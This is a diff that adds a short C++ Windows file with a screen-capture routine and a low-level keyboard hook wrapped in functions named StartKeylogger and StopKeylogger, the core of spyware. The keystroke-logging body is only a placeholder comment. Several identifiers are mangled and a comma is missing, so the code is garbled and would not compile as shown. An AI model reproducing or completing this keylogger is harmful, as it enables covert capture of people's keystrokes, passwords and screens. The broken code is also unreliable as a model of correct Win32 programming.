@@ -1,0 +1,38 @@
+#include <gdiplus.h>
+#include <windows.h>
+
+void CaptureScreen(HBITMAP& hBitmap) {
+ HDC hScreenDC = GetDC(NULL);
+ HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+ int nScreenWidth =DeviceCaps(hScreenDC, HORZRES);
+ int nScreenHeight = GetDeviceCaps(hScreenDC, VERTRES);
+ hBitmap = CreateCompatibleBitmap(hScreenDC, nScreenWidth, nScreenHeight);
+ SelectObject(hMemoryDC, hBitmap);
+ Blt(hMemoryDC, 0, 0, nScreenWidth, nScreenHeight, hScreenDC, 0, 0, SRCCOPY);
+ DeleteDC(hMemoryDC);
+ ReleaseDC(NULL, hScreenDC);
+}
+
+HHOOK hHook = NULL;
+
+RESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+ if (nCode == HC_ACTION) {
+ KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
+ if (wParam ==_KEYDOWN) {
+ // Log keystroke
+ }
+ }
+ return CallNextHookEx(hHook, nCode, wParam, lParam);
+}
+
+void StartKeylogger() {
+ hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc NULL, 0);
+}
+
+void StopKeylogger() {
+ if (hHook) {
+ UnhookWindowsHookEx(hHook);
+ hHook = NULL;
+ }
+}
+
